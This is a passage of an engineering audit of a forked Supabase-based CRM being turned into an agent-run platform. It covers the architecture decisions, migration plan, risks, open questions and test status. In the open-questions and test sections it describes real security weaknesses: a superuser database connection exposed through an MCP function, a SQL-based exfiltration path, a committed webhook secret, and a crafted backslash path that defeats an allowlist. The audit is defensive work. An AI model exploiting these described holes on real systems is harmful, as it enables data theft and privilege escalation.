| Observability | **Absent** | `sentry`, `opentelemetry`, `pino` → 0 hits; `[analytics] enabled = false`; 49 raw `console.*` |
| Audit trail | **Absent** (`activity_log` is a decoy) | `03_views.sql:6-72` |
| Idempotency | **Absent** | The single `idempot` hit is an MCP protocol *hint* |
| Retry / backoff / DLQ | **Absent** | Every `retry` hit is an i18n string or `retry: false` |
| Rate limiting / quota | **Absent** | 0 hits |
| Autonomy levels | **Absent** | `autonomy`, `hitl`, `guardrail` → 0 hits |
| Risk policy | **Absent** | `risk_level`, `risk_polic` → 0 hits |
| Maker-checker / approval queue | **Absent in the product** | All 4 `approval` hits are in `.claude/` dev tooling |
| State machines | **Partial** | Two CHECK-constrained enumerations exist; **transitions and guards** are what is missing |
| Multi-tenancy | **Absent and structurally blocked** | No tenant column; `configuration` is CHECK-pinned to one row |
| RBAC beyond a boolean | **Absent** | `role in ('owner','operator')` + two booleans |
| Concurrency control | **Absent** | No version column, no `for update`, no advisory locks. Last-write-wins |
| Feature flags / kill switch | **Absent** | 0 hits |
| Contract validation | **Effectively absent** | `zod` unused in `src/`, and version-split v4/v3 |
| Secret management | **Worse than absent** | See §7.1 |
| RLS / policy tests | **Absent** | 0 policy assertions across 29 unit files and 4 e2e specs |

---

## 9. Recommended target architecture

Full detail in [ARCHITECTURE.md](ARCHITECTURE.md). The eight decisions that must be settled before Phase-1 code, with recommendations:

| # | Decision | Recommendation | Why it is expensive to reverse |
| --- | --- | --- | --- |
| **D1** | Where does the runtime execute? | **Postgres as durable queue + scheduler, plus one small always-on worker that leases jobs.** | Edge Functions are per-request Deno isolates; a multi-minute agent turn has nowhere to run. Reversing this rewrites every tool call. |
| **D2** | Tenancy shape | **`tenant_id` + RLS, but only on engine tables in a NEW schema.** Treat `public.*` as tenant-one's CRM instance. | Avoids rewriting 43 inherited policies; makes the CRM genuinely swappable; uses the PostgREST allowlist as a hard browser boundary. `configuration`'s singleton CHECK means "add a nullable column" is not available anyway. |
| **D3** | Id strategy at the seam | **UUID/ULID engine PKs; never a FK into `public.*`.** Reference the CRM as `(crm_provider, crm_entity, crm_id)`. | One bigint FK into `deals` silently welds Atomic CRM to the core and makes "replaceable adapter" a slogan. |
| **D4** | What is a principal? | **Engine-owned `principals` table** (human / agent / service), with a mapped `sales` row only when an agent must act *through* the CRM adapter. | Putting agents in `sales` pollutes the human directory, inherits a two-value role CHECK, and makes "agent X acted on behalf of Y" inexpressible. |
| **D5** | Does `ra-core` cross the engine boundary? | **Keep `ra-core` for CRM screens; forbid it in the engine.** | Every type in `types.ts` is `& Pick<RaRecord,"id">`. Unwinding `RaRecord` from agent/run/approval types later is a full rewrite. |
| **D6** | Declarative schema or hand-written migrations | **Make declarative real this week**: add `schema_paths`, add a CI job asserting `supabase db diff` is empty, gate `deploy.yml` on `check.yml`. | This single missing config key is the direct cause of a ~1,000-line security rewrite reaching no database. |
| **D7** | Relationship to the existing chat-service launcher | ✅ **Settled** — [ADR 0007](adr/0007-launcher-relationship.md) is `Accepted`; §13 Q2 is answered. | `harness.config.json:101-106` and `.claude/rules/launcher-interface.md` show an external product ("CRM Builder's chat-service") already drives this repo. Whether the Company OS *is* that launcher, is driven by it, or replaces it determines whether `.claude/` is an asset or dead weight. |
| **D8** | Fork posture | **Hard-fork.** Stop tracking upstream, stop publishing the registry, put the engine outside `src/components/`. | 41 modified files already contradict the fork's own upstream policy; the registry republishes 214 of them. Chasing marmelab while inverting the architecture taxes every merge and buys nothing. |

### Shape

```
apps/
  crm-web/          the existing Atomic CRM SPA, mounted as one module
  ops-web/          Phase-1 admin screens (ugly, guesser-based)
packages/
  engine-core/      domain: company, department, agent, task, event, decision,
                    review, approval, workflow, run, audit. No ra-core, no Supabase.
  policy/           autonomy levels, risk classification, budget checks — pure functions
  ports/            CRMProvider, LLMProvider, MessagingProvider, AdsProvider … interfaces only
  adapters/
    crm-atomic/     implements CRMProvider over the existing dataProvider
    llm-anthropic/
services/
  worker/           the always-on process: leases jobs, runs agents, writes runs+costs
supabase/
  schemas/          public.* (CRM, unchanged) + ops.* (engine, new schema)
```

**Non-negotiables that fall out of the audit:**
- Engine tables live in a schema **not** in `config.toml:11`'s PostgREST allowlist. The browser reaches them only through the worker's API.
- Every engine table carries `tenant_id`, and every policy routes through a helper, following `02_functions.sql:462-511`.
- Every engine table is append-only where it records history, enforced by `REVOKE UPDATE, DELETE` — following the `lead_profiles` precedent, which already has no INSERT/DELETE policy and is written only by a SECURITY DEFINER trigger.
- `force row level security` on every engine table, so the owner role does not bypass policy.
- Deterministic code owns arithmetic, permission checks, risk evaluation, budget checks and threshold detection. LLMs own language, interpretation, classification and recommendation. This is a hard boundary, not a preference.

---

## 10. Migration strategy

**Do not migrate anything yet.** The first move is custodial, not architectural.

**Step 0 — make the work safe (hours, not days).** ✅ **Mostly done as of 2026-09-11.** The typecheck and lint errors are fixed (both gates now pass) and the working tree is committed in four reviewable parts. **The push has not happened** — do `git push -u origin feature/clinical-phase-1` now; that is the whole of the remaining custody risk, and it is also the first time CI will ever see this code.

> **Correction (2026-09-11).** An earlier version of this step said "`make` is absent, so `.husky/pre-commit`'s first line fails harmlessly (verified: husky does not `set -e`)". **That was wrong**, and it contradicted §6 of this same document. `.husky/_/h:17` invokes the hook as `sh -e "$s" "$@"`, so the missing `make` aborts at line 1 with exit 127, `npx lint-staged` never runs, and git rejects the commit. Every commit on this machine needs `--no-verify` until the hook is fixed (use `npm run registry:gen`, or drop the step per [ADR 0008](adr/0008-fork-posture.md)). §6 is the correct account; this step was the wrong half.

**Step 1 — restore deployability.** Wire `[db.migrations] schema_paths` into `config.toml`, generate exactly one reviewed migration from the pending schema delta, gate `deploy.yml` on `check.yml`, and add a CI job asserting `supabase db diff` produces empty output. Fix `seed.sql`/`loss_reasons` so `db reset` works again.

**Step 2 — close the bootstrap deadlock and the four critical security holes** (§7 items 1–5) before any real data exists.

**Step 3 — build the engine beside the CRM, never inside it.** New schema, new package, adapter boundary from the first commit. The CRM keeps working untouched throughout; that is the test that the adapter is real.

**Step 4 — retire, don't rewrite.** When the engine owns workflows, the psychology CHECK constraint on `deals` becomes one migration to drop. Deliberately leave it in place until then.

---

## 11. Phase-by-phase implementation plan

See [ROADMAP.md](ROADMAP.md). Summary:

| Phase | Goal |
| --- | --- |
| **0** | Baseline (this document) |
| **0.5** | **Custody & deployability** — commit the work, wire declarative migrations, gate deploy on CI |
| **1** | Security floor — bootstrap an owner, close the critical holes, first RLS tests |
| **2** | Engine foundation — `ops` schema, tenancy, principals, append-only audit |
| **3** | Event + task infrastructure — outbox, queue, worker, scheduler, idempotency |
| **4** | Agent runtime — model router, structured outputs, agent runs, cost accounting |
| **5** | Governance — autonomy levels, risk policy, maker-checker-approver, approval queue |
| **6** | CRM abstraction — `CRMProvider` port + `AtomicCRMAdapter` |
| **7** | Phase-1 UI — ugly admin screens over the engine |
| **8+** | WhatsApp (with its own LGPD floor), marketing, finance, growth, Chief of Staff, browser automation, hardening, and **15 — the isometric UI** |

---

## 12. Major risks

Programme risks, distinct from the vulnerabilities in §7. Ordered by expected cost. Each names the trigger that would make it real, so it can be watched rather than merely acknowledged.

| # | Risk | Why it is likely | Cost if it lands | Mitigation (and where it is scheduled) |
| --- | --- | --- | --- | --- |
| R1 | **The one big migration goes wrong.** Phase 0.5 packages three new tables, seven columns, a 43-policy rewrite, the grants, a `contacts_summary` rewrite and an `init_state` security-posture flip into a single generated migration. | It is generated, not authored; it mixes four unrelated concerns; nobody has ever run it; and `db reset` is currently broken so it cannot be rehearsed end-to-end until `seed.sql` is fixed. | An unreviewable migration enters permanent history. Reversing it later means a second migration that must undo a view and a policy surface in the right order. | Fix `seed.sql` **first**, rehearse on a throwaway project, review the diff line by line, split it if it exceeds what one reviewer can hold. §10 Step 1. |
| R2 | **Tenancy is retrofitted rather than designed.** | The engine has no tenant concept today, `public.companies` already means something else, and the pressure to "just ship Reception" will arrive before Phase 2 finishes. | The single most expensive reversal on the roadmap — every `ops` table, policy and query. | [ADR 0002](adr/0002-tenancy-model.md); Phase 2 is a hard prerequisite for tenant two (sequencing rule 4). **Open sub-risk:** the RLS helper pattern ADR 0002 points at is `auth.uid()`-based and the worker holds no end-user JWT — see §13 Q11. |
| R3 | **Psychology vocabulary is frozen into engine DDL.** | It already happened twice: the nine-value `deals_pipeline_stage_check` (`01_tables.sql:86-96`) and the five-value `operational_status` (`:160`). Phase 0.5 would make both permanent migration history while §13 Q4 is still open. | Tenant two cannot be onboarded without a schema migration, which is exactly what "the engine is not psychology-specific" was meant to prevent. | **Answer Q4 before Phase 0.5 step 4**, not before Phase 2. `loss_reasons` already demonstrates the reference-row alternative. |
| R4 | **Runaway model spend.** | Budgets, the kill switch and cost accounting all land in Phase 4; the temptation is to run one agent "just to see" before them. | Unbounded provider bills with no per-agent attribution to diagnose them. | Cost ledger, per-agent budgets **and a fleet-wide kill switch** ship in the same phase as the runtime (sequencing rule 3). The kill switch must be a Scope/Test/Acceptance item, not a note. |
| R5 | **An agent takes an irreversible external action.** | Idempotency, risk policy and approvals are Phases 3–5; WhatsApp and Ads are Phase 8+. The gap is the danger. | A duplicated patient message, a duplicated Ads budget change, an un-retractable send. Reputational and LGPD exposure for a clinic. | No integration before governance (sequencing rule 2). Idempotency keys from Phase 3's first commit, not retrofitted. |
| R6 | **Approval fatigue silently disables the control.** | If the risk policy is mis-tuned, the owner is asked about trivia, learns to click approve, and the human gate becomes a rubber stamp. | The governance layer costs real money and provides no safety. | Treat "the owner was asked something trivial" as a **bug with a ticket**, not a preference. Phase 5 acceptance requires LOW-risk actions to execute unasked. |
| R7 | **The work is lost or lands unreviewed.** | Four commits exist on one disk, never pushed, never seen by CI. | Total loss of Phase 0, or ~2,300 lines merged in one unreviewable push. | `git push -u origin feature/clinical-phase-1` today; open a PR so `check.yml` runs on it. §10 Step 0. |
| R8 | **The environment blocks the plan on day one.** | Every remaining Phase 0.5 step needs a local Supabase, and **the Docker daemon is not running** on this machine (verified 2026-09-11) even though the CLI is installed. `make` is also absent and `.husky/pre-commit` blocks every commit without `--no-verify`. | Phase 0.5 stalls at its first command, and the failure looks like a code problem. | Preflight both before starting: `docker info`, and fix or bypass the husky hook. §15. |
| R9 | **The fork publishes clinic code, or is overwritten by upstream.** | `registry.json` already lists 214 `atomic-crm` files and republishes on push to `main`; `doc/` ships an instruction to overwrite the fork with `-o`. | Clinic vocabulary and patient-adjacent domain logic become public artefacts; or a well-meaning update deletes the fork's work. | [ADR 0008](adr/0008-fork-posture.md) — cheap now because the fork has no `gh-pages` branch yet. Delete or rewrite `getting-updates.mdx` in the same change. |
| R10 | **Documentation drifts from the code and is then trusted anyway.** | This report was materially stale **one day** after it was written, and its own §10 contradicted its own §6. | Agents and engineers act on false premises; `CLAUDE.md` is auto-loaded into every session. | Re-verify the load-bearing claims at each phase boundary, as was done on 2026-09-11. Prefer mechanisms (a CI `db diff` check) over prose wherever a claim can be asserted by a test. |

---

## 13. Open questions

Ordered by how much they block. **Q2 and Q3 are answered.** The ones that still block are **Q1 and Q4 — and Q4 now blocks Phase 0.5, not Phase 2**, because Phase 0.5 step 4 would freeze the psychology CHECK into permanent migration history. Q11 is new and blocks Phase 2.

**Q1 — Documentation language.** `.claude/rules/english-only.md` mandates English for docs and default config values; `docs/product/*.md` (624 lines) is Portuguese, and pt-BR literals are already in `defaultConfiguration.ts` and `seed.sql`. Is the rule in force? The clean resolution: English for everything structural, tenant vocabulary as *data* in `docs/project-context.json` (which `.claude/skills/setup-interview` exists to produce and which **does not exist yet**).

**Q2 — What is the Company OS relative to the chat-service launcher?** ✅ **ANSWERED 2026-09-10** — decision delegated to the architect and recorded in [ADR 0007](adr/0007-launcher-relationship.md): the Company OS supersedes chat-service; the `launcher` block is inert dev-harness config and constrains nothing in the engine. Grounds: `launcher-interface.md` documents every consumer as inert when unset, all four extension points are development mechanics, and all 20 readers of `CHAT_SESSION_DIR` live under `.claude/` — zero product code reads it.

**Q3 — Does a hosted Supabase project exist, and what state is its database in?** ✅ **ANSWERED 2026-09-10 — no. Development is local-only, nothing is deployed.** Consequences: the login lockout (§0.3) is latent rather than live; every §7 critical item can be closed before real data exists; and `supabase db push` must not be run against any project until Phase 0.5 has packaged the pending migration.

**Q4 — Is the psychology pipeline tenant configuration or engine schema?** 🔴 **Escalated 2026-09-11: this now blocks Phase 0.5, not Phase 2.** Today it is a CHECK constraint on the shared `deals` table (`01_tables.sql:86-96`) — the exact thing the brief forbids, and `CLAUDE.md` rule 2 names it as "the mistake to not repeat". There is now a **second** instance: `lead_profiles.operational_status`'s five-value CHECK at `:160`. Phase 0.5 step 4 generates one migration from the pending schema delta and its acceptance criterion is an empty `supabase db diff` — which makes both CHECKs permanent migration history **before this question is answered**. The fork's own `loss_reasons` table already demonstrates the reference-row alternative. Decide first; the answer changes what the migration contains.

**Q5** — Are `docs/product/01-07` formally superseded, retained as dated tenant-one requirements, or still current? ~~They are untracked, so an edit is unrecoverable.~~ **Corrected 2026-09-11: all 8 files are tracked** (committed in `652784b3`), so edits are fully recoverable. The "do not edit, supersede with a dated note" guidance may still be the right policy for provenance, but its stated justification was false. Note the reconciliation is narrower than it first appears: the prior docs do not forbid agents outright — they defer them and impose conditions (explainability, scoped tools, approval for writes, audit). Their human-approval posture is **directly adoptable** as the OS approvals model. The genuine conflicts are: AI must not become a second administration interface (`01:79`), and the ban on "distributed architecture" (`01:38`) versus D1's worker.

**Q6** — Is the MCP function an end-user connector (as `doc/` describes, for Claude.ai/ChatGPT) or the internal tool surface for the company's own agents? Do `query`/`mutate` survive at all? They are the fastest agent-to-data path and the largest blast radius, and they are structurally incompatible with "Atomic CRM is a replaceable adapter".

**Q7** — Is inbound email (Postmark) in scope? It is the only untrusted external channel that currently reaches the database, it has the committed webhook password, and it still uploads attachments to a disabled bucket.

**Q8** — Multi-tenant LGPD scope: does each tenant get its own legal basis, retention policy, DPA and DPIA, and does the platform operator become a processor for its tenants?

**Q9** — Must the engine be emulated by the FakeRest provider (`AGENTS.md:137-141`), or is FakeRest scoped to the CRM adapter only? This roughly doubles or halves the cost of every engine table.

**Q10** — Is the marmelab telemetry beacon acceptable in this deployment? ~~One-word fix~~ — **corrected 2026-09-11: there are two beacons, not one.** `root/CRM.tsx:144` is reachable via the `disableTelemetry` prop, but `src/components/admin/admin.tsx:53-54` fires a second one from inbound shadcn-registry content that `CLAUDE.md` forbids modifying — so killing it needs a different mechanism than a `<CRM />` prop. Related and also undocumented: the browser makes **four** third-party calls, not two — `favicon.show`, a direct `/favicon.ico` fetch, and **Gravatar**, which sends `sha256(contact_email)` to Automattic (`getContactAvatar.ts:16-18`). For a psychology clinic that is an LGPD question, not a cosmetic one.

**Q11 — How does the worker obtain tenant context for `ops.*` RLS?** *(New, 2026-09-11. Blocks Phase 2.)* [ADR 0002](adr/0002-tenancy-model.md) and `ARCHITECTURE.md` §4 both specify that every `ops` table routes policy through a helper "following `02_functions.sql:462-511`". Every one of those helpers resolves through `auth.uid()`, which reads a Supabase JWT claim. But [ADR 0001](adr/0001-runtime-execution-substrate.md) makes an always-on worker the only process that touches `ops.*`, and it holds **no end-user JWT**. The cited pattern therefore cannot supply tenant context for the only caller that needs it, and no alternative (`set_config('app.tenant_id', …)` with a scoped non-superuser role, or a per-tenant role) is specified anywhere. Answer this before writing the first `ops` policy.

**Q12 — Does the MCP function survive Phase 2, and if not, when is it removed?** *(New, 2026-09-11.)* ADR 0002's central safety claim is that keeping `ops` off the PostgREST allowlist makes the engine "unreachable from any browser **by construction**". That is false while `supabase/functions/mcp/index.ts:22-25` holds a `postgres`-superuser `Pool` and exposes `query`/`mutate` with no schema restriction: a raw libpq connection ignores the PostgREST allowlist entirely, and a superuser ignores `force row level security`. Either the MCP function is removed//downgraded before `ops` exists, or the tenancy ADR's safety claim must be restated honestly. Phase 2's isolation test as written (ROADMAP) tests PostgREST — the wrong channel.

**Q13 — Where does the monorepo come from?** *(New, 2026-09-11.)* `ARCHITECTURE.md` §5 and §9's "Shape" block describe `apps/crm-web`, `apps/ops-web`, `packages/engine-core`, `packages/policy`, `packages/ports`, `packages/adapters/crm-atomic` and `services/worker`. None exists: there is no `apps/`, `packages/` or `services/` directory and `package.json` has no `workspaces` key — this is a single-package Vite app. No phase creates the workspace, the tsconfig project references, or the lint rule that [ADR 0005](adr/0005-ra-core-boundary.md) says must enforce the `ra-core` boundary "mechanically, not by convention". Until that exists, every boundary in this architecture is a convention.

---

## 14. What should NOT be changed yet

- **`supabase/migrations/` history.** Never hand-edit an applied migration. Reconcile via a new generated migration.
- **The exact `pg_dump` formatting of `02_functions.sql`.** `AGENTS.md:33` warns that any deviation produces phantom diffs forever. Regenerate with `npx supabase db dump --local --schema public`, never hand-format.
- **Do not run `supabase db diff` casually.** The next diff emits ONE migration mixing the clinic pipeline, the 43-policy rewrite, the grants and the storage change. Packaging it is a deliberate act (Phase 0.5), not a side effect.
- **The `auth.users → sales` triggers and the `sales` table.** Every policy, helper and the `users` function depend on them.
- **`public.companies` and the `company_id` name.** 30+ call sites plus RLS helpers depend on the current meaning. Introduce a distinct name for tenancy; never repurpose this one.
- **`deals.stage`.** Force-overwritten and redundant, but `not null` and still read by upstream-derived UI. Removing it is a coordinated frontend change.
- **`public.tasks` and its `contact_id not null` FK.** A live feature with e2e coverage and an MCP tool bound to it. The engine needs its own task table; do not overload this one.
- **`.claude/` harness internals.** 30+ hooks depend on each other's `/tmp` state and git topology. Study it for patterns; do not refactor it.
- **`mcp/validateSql.ts`.** Incomplete, but the only guard between a model and `DROP TABLE`. Extend it and its tests; do not rewrite.
- **`config.toml [auth.oauth_server] enabled = false`.** Leave off until MCP token validation gains audience/resource checks and `getBaseUrl` stops trusting `x-forwarded-host`.
- **The attachments bucket.** Do not flip it public or restore the upload path until there is a per-tenant path convention, short-lived signed URLs and a MIME/size allowlist.
- **`supabase/signing_keys.json` and `.env.e2e`.** Do not delete in place — `config.toml:85`, `makefile:73` and `e2e/fixtures.ts:6` depend on them. Rotate deliberately, as its own change.
- **`docs/product/*.md`.** Tracked prior art in Portuguese (committed `652784b3`), kept as a dated record. Supersede with a dated note; do not edit during reconciliation. (The old reason — "untracked, so an edit is unrecoverable" — no longer applies; the provenance reason does.)
- **The removed signup routes stay removed**, but keep `SignupPage.tsx` and `e2e/onboarding.spec.ts` — they document the flow that owner-provisioning has to replace.
- **The `MobileAdmin` tree.** A separate app with its own offline semantics and resource set. A second, independent scope.
- **Unrelated defects** (`make watch`, the ghpages exit code, the duplicate index) — real, but do not bundle them into schema or deploy changes.

---

## 15. Test / build / lint status

Re-run on this machine 2026-09-11 against `729f5966` (Windows 11, Node v22.23.1, npm 10.9.8, Docker CLI 29.7.2 **with the daemon stopped**, Supabase CLI 2.117.0). `node_modules` holds 674 packages; Playwright Chromium 1223 is installed and matches the pinned revision.

| Command | 2026-09-10 | 2026-09-11 |
| --- | --- | --- |
| `npm run typecheck` | ❌ FAIL — 5 errors | ✅ **PASS** |
| `npm run lint` | ❌ FAIL — 2 errors | ✅ **PASS** (one warning: `.eslintignore` is no longer supported) |
| `vitest --project functions` | ✅ PASS | ✅ **PASS** — 4 files, **108/108** |
| `vitest --project claude` | ❌ 47 failed | ✅ **253 passed / 0 failed** — fixed 2026-09-11 (1 file still fails to *collect*; see below) |
| `vitest --project app` (browser mode) | ✅ PASS — 286 passed | ✅ **PASS — 189 passed, 1 skipped** (25 files). Was 13 failed; fixed 2026-09-11 |
| Browser-mode prerequisite | ⚠️ recorded as BLOCKED | ✅ **Chromium 1223 installed** — the "blocked" note was wrong |
| `npm run build` | ⚠️ green but does not typecheck | ⚠️ unchanged (§6) |
| e2e | ⚠️ NOT RUN, red for 3 reasons | ⚠️ NOT RUN — **four** reasons (ROADMAP Phase 0.5 step 7), and blocked anyway while the Docker daemon is down |
| `supabase db reset` / `db diff` | ❌ seed failure | ⚠️ **NOT RUNNABLE** — Docker daemon not running |

**The five typecheck errors are fixed.** They were real, and `2b5f20bb` fixed them: `ProfilePage.tsx:96-97` no longer declares unused `record`/`refetch`; `note_or_attachment_required` has zero occurrences anywhere in `src/`; `acquired_at` and `operational_status` are now generated at `fakerest/dataGenerator/contacts.ts:109,112`. The line references printed in the previous version of this section now point at unrelated code — they are obsolete, not merely shifted, and should be re-derived rather than re-numbered.

**The 47 harness failures were five real hook defects, not dev-tooling noise (fixed 2026-09-11).** An earlier version of this section called them "Windows environment incompatibilities ... not product defects". That was wrong in a way worth recording: every one of them failed **silently and in the safe-looking direction**, which is exactly why they read as harmless.

- `cleanup-worktree.mjs` **deleted live worktrees, including uncommitted developer work.** `git worktree list --porcelain` prints POSIX separators on every platform, while the hook built its comparison paths with `join()`; `registered.includes(dir)` was therefore never true, so the guard in front of `rmSync(dir, {recursive:true, force:true})` never fired. The `_session` guard (`dir.endsWith("/_session")`) failed identically, so the merger's own worktree was swept too. The fix must **absolutize as well as fold**: `TMP_ROOT` defaults to the literal `"/tmp"`, which Node turns into a drive-relative path on Windows while git reports an absolute drive-lettered one — folding alone left the hook destructive while turning the test green, which is the trap an adversarial review caught.
- `restrict-documentator-write.mjs` degenerated to **deny-everything**, so the documentator could not write `MEMORY.md`, its ledger or `settings.local.json`. Its fold is gated on `win32` on purpose: `\` is legal in a Linux filename, so an ungated fold would make `/…/local\evil/x.md` match the allowlist — a privilege escalation on the harness's actual deployment target.
- `link-session-workspace.mjs` needed `SeCreateSymbolicLinkPrivilege`; the `EPERM` was swallowed as "skipped". It now creates a junction.
- `check-config-sync.mjs` and `pending-deploys.mjs` never executed their CLI block, because `import.meta.url === \`file://${process.argv[1]}\`` is never true on Windows. Both exited 0 doing nothing, and callers read that as success — so the config-sync gate and the orchestrator's migration gate were silently skipped.

**Three instances of the same root cause remain, deliberately unfixed** (they are not failing-test fixes, so they need their own decision): `lib/validation.mjs:16` (`getActiveWorktrees()` returns `[]`, so `validate-on-stop` validates nothing), `cleanup-session.mjs:69,75`, and `cleanup-worktree.mjs`'s `removeWorktreeFolders(...)` call.

**And the reason none of it was caught: `check.yml` runs only `test:unit:app` and `test:unit:functions`. The `claude` project is never run in CI.** That is a gap in the gate, not in the tests.

> **✅ Fixed 2026-09-11 — the `app` project is green again (189 passed, 1 skipped, 0 failed).** It had 13 failures across 5 files, and **every failing file was one the fork changed in `2b5f20bb`**. The fork broke its own inherited test suite and nobody saw it, because the branch has never been pushed and `check.yml` has never run on it. Two of the thirteen were not stale tests at all:
>
> - **A live demo-mode bug.** `useDealImport.ts` was changed to group deals by `pipeline_stage`, but `dataGenerator/deals.ts` only ever set `stage` — so `lastIndexOf` matched nothing and every imported deal landed at index 0, stacking on top of existing ones. Fixed in the generator (both columns, mirroring the `synchronize_deal_pipeline` trigger), not in the test.
> - **`TaskCreateSheet` threw `Undefined collection "lead_profiles"`.** The FakeRest provider had no such collection. Fixed by adding `lead_profiles` and `acquisition_attributions` generators derived from the contact fields `contacts_summary` mirrors.
>
> Also corrected: `deals_sample.csv` — the file the "Download CSV sample" link hands users — still named upstream stages, so importing the app's own sample silently dumped every deal into *Novo lead*.
>
> **`getContactAvatar.test.ts` was never stale either — it was non-hermetic.** `vi.mock` does not mock that module under the browser-mode runner, so `vi.mocked(...).mockResolvedValue` threw, and the remaining cases silently reached the real gravatar.com over the network. Rewritten to stub the global `fetch` (which `fetchWithTimeout` wraps), making all seven deterministic.
>
> No test was deleted. The two cases that asserted an attachment could satisfy the note validator now assert the opposite — the contract the fork deliberately introduced — so the removal is pinned rather than untested.

---

## Appendix — how this report was produced

Ten inspection agents (frontend, data layer, database, migrations/deploy, edge functions, security, testing/CI, in-flight work, prior docs, capability gap), each followed by an independent adversarial verifier that re-opened the files and graded every headline claim `CONFIRMED` / `PARTIALLY_TRUE` / `REFUTED` / `UNVERIFIABLE` and reported what the reader missed; then one completeness critic over the merged result. 21 agents, ~3.1M tokens, 1,065 tool calls, zero agent errors.

Several headline claims were corrected by verification and the corrections are reflected above — most importantly that `canAccess` is a **default-allow deny-list**, not an allow-list; that the deploy failure mode is **PostgREST 42703 on every login**, not "no owner can be created"; that `npm run build` **does not typecheck**, so it is not a gate; and that the prior product docs **defer and condition** agents rather than forbidding them.

Claims that remain **UNVERIFIED** are marked as such in §13 (Q3 above all: whether a hosted Supabase project exists and what its database actually contains). Everything else reasons from files in this checkout.

---

## Verification pass (2026-09-11)

This report was re-checked one day after it was written, against `729f5966`, by 77 agents across 12 dimensions: CI/deploy, schema custody, auth, RLS and grants, edge functions, secrets, the frontend data-provider boundary, tests, engine readiness, fork posture, the internal integrity of these documents, and coverage against the owner's brief. Every high-impact finding was then handed to an adversarial verifier instructed to refute it, and two critics swept for what the dimensions missed.

**232 findings: 98 confirmed, 31 stale, 31 wrong, 71 previously undocumented.** Four high-impact findings were refuted by verification and are not recorded. Corrections are folded into the sections above and dated inline.

What the pass actually established, beyond the individual corrections:

- **The documents went materially stale in one day.** Three commits invalidated the provenance header, the framing device in §0, the typecheck listing in §12, and every "uncommitted / in the working tree" phrasing across four files. None of it was wrong when written.
- **Two of the corrections were self-contradictions, not drift.** §10 Step 0 asserted that husky "does not `set -e`" while §6 of the same document correctly said the opposite; `DECISIONS.md` called ADR 0007 `OPEN` two lines above a table marking it `Accepted`. A document long enough to be useful is long enough to disagree with itself, and only re-reading it as a whole catches that.
- **The most serious findings were in the gaps between topics, not inside them.** `merge_contacts` cascading away `do_not_contact` needed someone looking at the new schema *and* an untouched edge function at once. The `extensions.http` exfiltration path needed the SQL validator *and* the grant scope. Neither belongs to a single dimension, which is why neither was found the first time.
- **One environment fact was taken on trust and was wrong.** `CLAUDE.md` stated Docker was working; the CLI is installed and the daemon is not running. Every remaining Phase 0.5 step depends on it.

**Load-bearing claims that remain unverified**, and should be treated as open rather than assumed: the `app` test suite's status on Windows (§15); anything requiring a running database (`db diff`, `db reset`, e2e, and therefore the real content of the pending migration); and the behaviour of any hosted Supabase project, which the owner has confirmed does not exist.

The practical conclusion is in §12 R10: prefer mechanisms over prose wherever a claim can be asserted by a test. A CI job that fails when `supabase db diff` is non-empty is worth more than any paragraph in this document saying the schema is unmigrated.
